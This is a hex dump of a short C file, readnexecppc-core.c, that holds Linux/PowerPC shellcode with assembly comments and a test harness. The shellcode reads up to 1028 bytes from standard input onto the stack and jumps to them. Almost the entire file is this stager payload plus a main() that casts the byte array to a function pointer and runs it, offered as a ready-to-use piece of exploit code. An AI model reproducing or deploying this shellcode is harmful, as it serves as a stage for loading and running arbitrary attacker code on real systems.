00000000  2f 2a 20 72 65 61 64 6e  65 78 65 63 70 70 63 2d  |/* readnexecppc-|
00000010  63 6f 72 65 2e 63 20 62  79 20 43 68 61 72 6c 65  |core.c by Charle|
00000020  73 20 53 74 65 76 65 6e  73 6f 6e 20 3c 20 63 6f  |s Stevenson < co|
00000030  72 65 40 62 6f 6b 65 6f  61 2e 63 6f 6d 20 3e 20  |re@bokeoa.com > |
00000040  2a 2f 0d 0a 63 68 61 72  20 68 65 6c 6c 63 6f 64  |*/..char hellcod|
00000050  65 5b 5d 20 3d 20 2f 2a  20 72 65 61 64 28 30 2c  |e[] = /* read(0,|
00000060  73 74 61 63 6b 2c 31 30  32 38 29 3b 20 73 74 61  |stack,1028); sta|
00000070  63 6b 28 29 3b 20 6c 69  6e 75 78 2f 70 70 63 20  |ck(); linux/ppc |
00000080  62 79 20 63 6f 72 65 20  2a 2f 0d 0a 22 5c 78 37  |by core */.."\x7|
00000090  63 5c 78 36 33 5c 78 31  61 5c 78 37 39 22 20 20  |c\x63\x1a\x79"  |
000000a0  20 20 20 2f 2a 20 78 6f  72 2e 20 20 20 20 72 33  |   /* xor.    r3|
000000b0  2c 72 33 2c 72 33 20 2a  2f 0d 0a 22 5c 78 33 38  |,r3,r3 */.."\x38|
000000c0  5c 78 61 30 5c 78 30 34  5c 78 30 34 22 20 20 20  |\xa0\x04\x04"   |
000000d0  20 20 2f 2a 20 6c 69 20  20 20 20 20 20 72 35 2c  |  /* li      r5,|
000000e0  31 30 32 38 20 2a 2f 0d  0a 22 5c 78 33 30 5c 78  |1028 */.."\x30\x|
000000f0  30 35 5c 78 66 62 5c 78  66 66 22 20 20 20 20 20  |05\xfb\xff"     |
00000100  2f 2a 20 61 64 64 69 63  20 20 20 72 30 2c 72 35  |/* addic   r0,r5|
00000110  2c 2d 31 30 32 35 20 2a  2f 0d 0a 22 5c 78 37 63  |,-1025 */.."\x7c|
00000120  5c 78 32 34 5c 78 30 62  5c 78 37 38 22 20 20 20  |\x24\x0b\x78"   |
00000130  20 20 2f 2a 20 6d 72 20  20 20 20 20 20 72 34 2c  |  /* mr      r4,|
00000140  72 31 20 2a 2f 0d 0a 22  5c 78 34 34 5c 78 64 65  |r1 */.."\x44\xde|
00000150  5c 78 61 64 5c 78 66 32  22 20 20 20 20 20 2f 2a  |\xad\xf2"     /*|
00000160  20 73 63 20 2a 2f 0d 0a  22 5c 78 36 39 5c 78 36  | sc */.."\x69\x6|
00000170  39 5c 78 36 39 5c 78 36  39 22 20 20 20 20 20 2f  |9\x69\x69"     /|
00000180  2a 20 6e 6f 70 20 2a 2f  0d 0a 22 5c 78 37 63 5c  |* nop */.."\x7c\|
00000190  78 32 39 5c 78 30 33 5c  78 61 36 22 20 20 20 20  |x29\x03\xa6"    |
000001a0  20 2f 2a 20 6d 74 63 74  72 20 20 20 72 31 20 2a  | /* mtctr   r1 *|
000001b0  2f 0d 0a 22 5c 78 34 65  5c 78 38 30 5c 78 30 34  |/.."\x4e\x80\x04|
000001c0  5c 78 32 31 22 3b 20 20  20 20 2f 2a 20 62 63 74  |\x21";    /* bct|
000001d0  72 6c 20 2a 2f 0d 0a 0d  0a 69 6e 74 20 6d 61 69  |rl */....int mai|
000001e0  6e 28 76 6f 69 64 29 0d  0a 7b 0d 0a 20 20 76 6f  |n(void)..{..  vo|
000001f0  69 64 20 28 2a 73 68 65  6c 6c 29 28 29 20 3d 20  |id (*shell)() = |
00000200  28 76 6f 69 64 20 2a 29  26 68 65 6c 6c 63 6f 64  |(void *)&hellcod|
00000210  65 3b 0d 0a 20 20 70 72  69 6e 74 66 28 22 25 64  |e;..  printf("%d|
00000220  20 62 79 74 65 20 72 65  61 64 20 26 20 65 78 65  | byte read & exe|
00000230  63 20 73 68 65 6c 6c 63  6f 64 65 20 66 6f 72 20  |c shellcode for |
00000240  6c 69 6e 75 78 2f 70 70  63 20 62 79 20 63 6f 72  |linux/ppc by cor|
00000250  65 5c 6e 22 2c 0d 0a 20  20 20 20 20 20 20 20 20  |e\n",..         |
00000260  73 74 72 6c 65 6e 28 68  65 6c 6c 63 6f 64 65 29  |strlen(hellcode)|
00000270  29 3b 0d 0a 20 20 73 68  65 6c 6c 28 29 3b 0d 0a  |);..  shell();..|
00000280  20 20 72 65 74 75 72 6e  20 30 3b 0d 0a 7d        |  return 0;..}|
0000028e
